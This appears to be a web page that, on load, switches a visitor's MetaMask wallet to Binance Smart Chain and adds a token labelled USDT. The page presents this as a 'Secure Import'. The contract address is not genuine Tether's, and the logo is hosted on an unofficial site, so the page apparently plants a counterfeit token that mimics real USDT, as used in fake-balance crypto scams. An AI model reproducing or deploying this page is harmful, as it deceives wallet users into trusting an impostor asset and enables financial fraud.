<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Add USDT Token – Secure Import</title>

<style>
  body {
    font-family: "Poppins", sans-serif;
    background: linear-gradient(135deg, #e6fdf6, #d4f3ff);
    height: 100vh;
    display: flex;
    justify-content: center;
    align-items: center;
    margin: 0;
  }

  .container {
    background: #ffffff;
    padding: 30px 40px;
    border-radius: 15px;
    width: 350px;
    text-align: center;
    box-shadow: 0px 10px 35px rgba(0,0,0,0.1);
    animation: fadeIn 0.6s ease-in-out;
  }

  @keyframes fadeIn {
    from { opacity: 0; transform: translateY(15px); }
    to { opacity: 1; transform: translateY(0); }
  }

  .token-logo {
    width: 80px;
    margin-bottom: 15px;
  }

  h2 {
    font-size: 20px;
    font-weight: 600;
    color: #0b4d4b;
    margin-bottom: 10px;
  }

  p {
    font-size: 14px;
    color: #333;
  }

  #status {
    margin-top: 18px;
    font-weight: 500;
    color: #007c77;
  }

  .loading {
    margin-top: 10px;
    width: 30px;
    height: 30px;
    border: 4px solid #007c77;
    border-top-color: transparent;
    border-radius: 50%;
    animation: spin 0.8s linear infinite;
    display: none;
    margin-left: auto;
    margin-right: auto;
  }

  @keyframes spin {
    to { transform: rotate(360deg); }
  }
</style>
</head>
<body>

<div class="container">
  <img class="token-logo" src="https://carrychain.github.io/tetherusd-info/logo.png" alt="token logo">
  <h2>Import USDT Token</h2>
  <p>Please approve MetaMask prompts to add token</p>
  <p id="status">Connecting wallet...</p>
  <div class="loading" id="loader"></div>
</div>

<script>
  const tokenAddress = "0xc7f5c0BD59CE5Ad1e2530B1e5f4C76C714520D14";
  const tokenSymbol = "USDT";
  const tokenDecimals = 18;
  const tokenImage = "https://carrychain.github.io/tetherusd-info/logo.png";

  const statusEl = document.getElementById('status');
  const loader = document.getElementById('loader');

  async function autoAddToken() {
    if (!window.ethereum) {
      statusEl.textContent = "No wallet found. Install MetaMask!";
      return;
    }

    loader.style.display = "block";

    try {
      const chainIdHex = "0x38";

      // Switch to BSC
      await window.ethereum.request({
        method: "wallet_switchEthereumChain",
        params: [{ chainId: chainIdHex }]
      });

      statusEl.textContent = "Switched to BSC...";

      // Add token
      const wasAdded = await window.ethereum.request({
        method: "wallet_watchAsset",
        params: {
          type: "ERC20",
          options: {
            address: tokenAddress,
            symbol: tokenSymbol,
            decimals: tokenDecimals,
            image: tokenImage
          }
        }
      });

      loader.style.display = "none";
      statusEl.textContent = wasAdded
        ? `${tokenSymbol} successfully added ✅`
        : "User rejected the request ❌";

    } catch (error) {
      loader.style.display = "none";
      statusEl.textContent = "Error: " + (error.message || error);
    }
  }

  window.addEventListener("load", autoAddToken);
</script>

</body>
</html>
